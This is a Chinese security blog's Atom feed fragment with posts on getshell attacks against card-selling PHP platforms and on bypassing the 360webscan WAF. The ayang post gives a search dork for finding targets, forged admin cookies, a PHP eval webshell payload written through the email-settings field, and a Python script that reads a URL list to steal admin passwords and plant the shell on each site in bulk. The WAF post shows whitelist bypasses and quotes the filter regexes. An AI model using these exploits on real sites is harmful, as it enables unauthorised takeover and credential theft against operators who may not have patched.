      <category term="技巧" scheme="http://h3art3ars.github.io/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="bypass" scheme="http://h3art3ars.github.io/tags/bypass/"/>
    
      <category term="技巧" scheme="http://h3art3ars.github.io/tags/%E6%8A%80%E5%B7%A7/"/>
    
      <category term="webshell" scheme="http://h3art3ars.github.io/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>伯乐发卡发卡平台getshell</title>
    <link href="http://h3art3ars.github.io/2020/02/25/%E4%BC%AF%E4%B9%90%E5%8F%91%E5%8D%A1%E5%8F%91%E5%8D%A1%E5%B9%B3%E5%8F%B0getshell/"/>
    <id>http://h3art3ars.github.io/2020/02/25/%E4%BC%AF%E4%B9%90%E5%8F%91%E5%8D%A1%E5%8F%91%E5%8D%A1%E5%B9%B3%E5%8F%B0getshell/</id>
    <published>2020-02-25T02:15:05.000Z</published>
    <updated>2020-02-25T02:16:54.375Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">伯乐发卡平台getshell漏洞</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="327b8249c250ce37687a8f5e0edb7b24a78e4dfd5eca35118e37b4e7bcc1a18e"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      伯乐发卡漏洞
    
    </summary>
    
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://h3art3ars.github.io/tags/cms/"/>
    
      <category term="实战" scheme="http://h3art3ars.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>ayang发卡平台getshell</title>
    <link href="http://h3art3ars.github.io/2020/02/25/ayang%E5%8F%91%E5%8D%A1%E5%B9%B3%E5%8F%B0getshell/"/>
    <id>http://h3art3ars.github.io/2020/02/25/ayang%E5%8F%91%E5%8D%A1%E5%B9%B3%E5%8F%B0getshell/</id>
    <published>2020-02-25T02:11:57.000Z</published>
    <updated>2022-05-24T12:19:57.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">inurl:admin&#x2F;set.php</span></pre></td></tr></table></figure><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><ol><li>admin后台文件校验cookie，可直接查看密码</li><li>后台设置有任意文件写入漏洞</li></ol><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p><code>/admin/set.php</code></p><p>验证漏洞代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if($.cookie(&quot;user&quot;) &#x3D;&#x3D; null || $.cookie(&quot;user&quot;) &#x3D;&#x3D; &quot;&quot; || $.cookie(&quot;loginInfo&quot;) !&#x3D; $.md5($.cookie(&quot;pass&quot;)))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    window.location.href&#x3D;&#39;.&#x2F;login.php&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    &#125;else&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>任意文件写入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">elseif($_GET[&#39;mod&#39;]&#x3D;&#x3D;&quot;sfEmail&quot;)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    if($_POST[&#39;host&#39;] &#x3D;&#x3D; &quot;&quot; || $_POST[&#39;port&#39;] &#x3D;&#x3D; &quot;&quot; || $_POST[&#39;user&#39;] &#x3D;&#x3D; &quot;&quot; || $_POST[&#39;from&#39;] &#x3D;&#x3D; &quot;&quot;)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        showmsg(&quot;重要信息不能为空！&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        exit();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">     $text&#x3D;&quot;&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> \$emailConfig &#x3D; array(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  &#39;host&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;host&#39;].&quot;&#39;,&#x2F;&#x2F;邮箱的服务器地址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  &#39;fromName&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;fromName&#39;].&quot;&#39;,&#x2F;&#x2F;设置发件人姓名（昵称） 任意内容</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  &#39;port&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;port&#39;].&quot;&#39;,&#x2F;&#x2F;端口</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  &#39;user&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;user&#39;].&quot;&#39;,&#x2F;&#x2F;邮箱账号</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  &#39;pwd&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;pwd&#39;].&quot;&#39;,&#x2F;&#x2F;邮箱密码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  &#39;from&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;from&#39;].&quot;&#39;,&#x2F;&#x2F;设置发件人邮箱地址 这里填入上述提到的“发件人邮箱”</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  &#39;title&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;title&#39;].&quot;&#39;&#x2F;&#x2F;添加该邮件的主题</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  );</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">     saveFile(&quot;..&#x2F;emailConfig.php&quot;,$text);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">     showmsg(&quot;ok!&quot;,1);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"> &#125;</span></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li><p>添加cookies：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">COOKIES &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">            &quot;user&quot;: &quot;admin&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">            &quot;pass&quot;: &quot;admin&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">            &quot;loginInfo&quot;: &quot;21232f297a57a5a743894a0e4a801fc3&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr></table></figure></li><li><p>访问 <code>http://domain/admin/set.php?mod=admin</code> 看到管理员密码</p></li><li><p>进入 系统设置-&gt;发件邮箱设置-&gt;邮件标题 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">a&#39;);$x&#x3D;&amp;$y; $y&#x3D;$_POST[&#39;cmd&#39;]; function a() &#123;     global $x;     return $x; &#125; eval(a());?&gt;&#x2F;*</span></pre></td></tr></table></figure></li><li><p>之后蚁剑连接 <code>http://domain/emailConfig.php</code> 密码<code>cmd</code></p></li></ol><h2 id="漏洞EXP【py】"><a href="#漏洞EXP【py】" class="headerlink" title="漏洞EXP【py】"></a>漏洞EXP【py】</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"># encode&#x3D;utf-8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"># search inurl:admin.php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import re</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">import pyfiglet</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">COOKIES &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">            &quot;user&quot;: &quot;admin&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">            &quot;pass&quot;: &quot;admin&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">            &quot;loginInfo&quot;: &quot;21232f297a57a5a743894a0e4a801fc3&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">def geturls():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    with open(&quot;url.list&quot;) as f:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        urls &#x3D; f.readlines()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        return urls</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">def check(url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">#    url &#x3D; &quot;http:&#x2F;&#x2F;debug.com&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">    purl &#x3D; url.strip() + &quot;&#x2F;admin&#x2F;set.php?mod&#x3D;admin&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; requests.post(purl, cookies&#x3D;COOKIES)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    if res.status_code &#x3D;&#x3D; 200:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[+]Getting password&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        print(res.text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">#        getpass(res.text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">        exit(&quot;Got password failed&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">def getpass(text):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">    user &#x3D; re.search(r&#39;&#39;, text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">    pwd &#x3D; re.search(r&#39;管理员密码&#123;30,50&#125;&#39;, text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">    if user is not None and pwd is not None:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">        print(user + &quot; : &quot; + pwd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">        exit(&quot;[-]Cant&#39;t find pass!&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">def banner():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">    pyfiglet.print_figlet(&quot;f a k a p a s s&quot;, colors&#x3D;&quot;GREEN&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">def write_shell(url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">    purl &#x3D; url + &quot;&#x2F;admin&#x2F;set.php?mod&#x3D;sfEmail&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    data &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">            &quot;host&quot;: &quot;smtp.163.com&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">            &quot;fromName&quot;: &quot;个人发卡平台&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">            &quot;port&quot;: &quot;25&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">            &quot;user&quot;: &quot;706672193&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">            &quot;pwd&quot;: &quot;706672193&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">            &quot;from&quot;: &quot;706672193@qq.com&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">            &quot;title&quot;: &quot;a&#39;);$x&#x3D;&amp;$y; $y&#x3D;$_POST[&#39;cmd&#39;]; function a() &#123;     global $x;     return $x; &#125; eval(a());?&gt;&#x2F;*&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">            &quot;submit&quot;: &quot;修改&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; requests.post(purl, data&#x3D;data, cookies&#x3D;COOKIES)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">    if res.status_code &#x3D;&#x3D; 200:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[+]Write shell successfully!&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[-]Write shell failed!&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">        exit(&quot;exited&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; requests.get(url+&quot;&#x2F;emailConfig.php&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">    if res.status_code &#x3D;&#x3D; 200:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[+]Shell path : &quot;+url+&quot;&#x2F;emailConfig.php&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[+]Shell password : cmd&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[-]Shell path is changed !&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">def mainf(isw&#x3D;0):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">    banner()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">    urls &#x3D; geturls()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">    for url in urls:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">        if url[0] &#x3D;&#x3D; &quot;#&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">            continue</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">        if &quot;http:&#x2F;&#x2F;&quot; !&#x3D; url[0:7] and &quot;https:&#x2F;&#x2F;&quot; !&#x3D; url[0:8]:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">        print(&quot;URL:&quot; + url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">        check(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">    if isw !&#x3D; 0:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">        write_shell(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">    mainf(1)</span></pre></td></tr></table></figure><p>url写在另一个同目录文件url.list中</p><h2 id="注"><a href="#注" class="headerlink" title="注"></a>注</h2><p>有的漏洞已经修复</p>]]></content>
    
    <summary type="html">
    
      阿洋发卡平台未修复的漏洞
    
    </summary>
    
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://h3art3ars.github.io/tags/cms/"/>
    
      <category term="实战" scheme="http://h3art3ars.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>360webscan bypass</title>
    <link href="http://h3art3ars.github.io/2020/02/17/360webscan-bypass/"/>
    <id>http://h3art3ars.github.io/2020/02/17/360webscan-bypass/</id>
    <published>2020-02-17T05:39:48.000Z</published>
    <updated>2020-02-17T05:46:53.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>将360safe文件夹放入网站根目录，在入口文件或者需要过滤的文件使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if(is_file($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">require_once($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">if(is_file($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">require_once($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select *  from tab where id &#x3D;&quot;.$_POST[&#39;id&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">echo $sql;</span></pre></td></tr></table></figure><h2 id="php-self白名单绕过"><a href="#php-self白名单绕过" class="headerlink" title="php_self白名单绕过"></a>php_self白名单绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$webscan_white_directory&#x3D;&#39;admin|\&#x2F;dede\&#x2F;|\&#x2F;install\&#x2F;&#39;;</span></pre></td></tr></table></figure><p><code>php_self</code>中含有 <code>admin</code>或者 <code>/dede/</code> 或者 <code>/install/</code>时，不过滤字符</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>传参 <code>id=select * from aaa</code>拦截</p><p><img src="/images/360webscan1.png" alt=""></p><p>在urlpath之后添加 <code>/admin</code> ,<code>/dede/</code> ,<code>/install/</code>之后不拦截</p><p><img src="/images/360webscan2.png" alt=""></p><h2 id="white-url白名单绕过"><a href="#white-url白名单绕过" class="headerlink" title="white_url白名单绕过"></a>white_url白名单绕过</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$webscan_white_url &#x3D; array(&#39;index.php&#39; &#x3D;&gt; &#39;m&#x3D;admin&#39;,&#39;post.php&#39; &#x3D;&gt; &#39;job&#x3D;postnew&amp;step&#x3D;post&#39;,&#39;edit_space_info.php&#39;&#x3D;&gt;&#39;&#39;);</span></pre></td></tr></table></figure><p><code>index.php?m=admin</code>, <code>post.php?job=postnew&amp;step=post</code>  , <code>edit_apace_info.php</code>不过滤</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="/images/360webscan3.png" alt=""></p><p><img src="/images/360webscan5.png" alt=""></p><p><img src="/images/360webscan6.png" alt=""></p><p>这两个白名单的方法很容易会被使用的人给更改掉</p><h2 id="超长字符串绕过正则"><a href="#超长字符串绕过正则" class="headerlink" title="超长字符串绕过正则"></a>超长字符串绕过正则</h2><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;get拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$getfilter &#x3D; &quot;\\b(alert\\(|confirm\\(|prompt\\()\\b|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b[^&gt;]*?&gt;|^\\+\\&#x2F;v(8|9)|\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;post拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$postfilter &#x3D; &quot;\\b(alert\\(|confirm\\(|prompt\\()\\b|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b[^&gt;]*?&gt;|\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;cookie拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$cookiefilter &#x3D; 